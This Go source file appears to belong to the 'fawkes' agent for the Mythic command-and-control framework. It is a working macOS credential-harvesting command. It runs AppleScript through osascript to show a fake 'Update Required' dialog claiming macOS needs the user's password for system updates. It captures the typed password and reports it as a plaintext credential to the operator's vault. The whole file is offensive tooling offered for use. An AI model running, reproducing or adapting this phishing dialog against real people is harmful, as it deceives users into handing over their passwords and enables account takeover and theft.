//go:build darwin

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// Helper functions (buildCredPromptScript, escapeAppleScript) are in
// credential_prompt_helpers.go (cross-platform) for testability.

// CredentialPromptCommand displays a native macOS credential dialog to harvest user credentials.
type CredentialPromptCommand struct{}

func (c *CredentialPromptCommand) Name() string {
	return "credential-prompt"
}

func (c *CredentialPromptCommand) Description() string {
	return "Display a native macOS credential dialog to capture user credentials (T1056.002)"
}

type credentialPromptArgs struct {
	Title   string `json:"title"`
	Message string `json:"message"`
	Icon    string `json:"icon"`
}

// credPromptTimeout is the max time to wait for user interaction.
const credPromptTimeout = 5 * time.Minute

func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
	var args credentialPromptArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	// Set defaults
	title := args.Title
	if title == "" {
		title = "Update Required"
	}
	message := args.Message
	if message == "" {
		message = "macOS needs your password to apply system updates."
	}
	icon := args.Icon
	if icon == "" {
		icon = "caution"
	}

	// Build the AppleScript for a native credential dialog
	script := buildCredPromptScript(title, message, icon)

	ctx, cancel := context.WithTimeout(context.Background(), credPromptTimeout)
	defer cancel()

	out, err := exec.CommandContext(ctx, "osascript", "-e", script).CombinedOutput()
	defer structs.ZeroBytes(out)
	if err != nil {
		output := strings.TrimSpace(string(out))
		if strings.Contains(output, "User canceled") ||
			strings.Contains(output, "(-128)") {
			return successResult("User cancelled the dialog")
		}
		return errorf("Dialog failed: %v\n%s", err, output)
	}

	password := strings.TrimSpace(string(out))
	defer structs.ZeroString(&password)
	if password == "" {
		return successResult("User submitted empty password")
	}

	// Get current username for credential reporting
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	var sb strings.Builder
	sb.WriteString("=== Credential Prompt Result ===\n\n")
	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
	sb.WriteString(fmt.Sprintf("Password: %s\n", password))
	sb.WriteString(fmt.Sprintf("Dialog:   %s\n", title))

	// Report credential to Mythic vault
	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          "local",
			Account:        username,
			Credential:     password,
			Comment:        "credential-prompt dialog",
		},
	}

	return structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

